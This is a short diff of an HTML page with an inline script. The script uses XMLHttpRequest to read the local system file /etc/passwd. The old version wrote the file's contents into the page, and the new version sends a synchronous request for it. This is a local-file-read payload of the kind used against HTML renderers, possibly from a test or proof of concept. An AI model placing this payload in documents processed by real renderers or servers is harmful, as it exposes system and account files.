@@ -4,13 +4,9 @@
 <body>
 
 <script>
-x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
-};
-x.open("GET","file:///etc/passwd");
-x.send();
-setTimeout(5000)
+var x = new XMLHttpRequest();
+x.open("GET", "file:///etc/passwd", false);
+x.send(null);
 </script>
 
 </body></html>
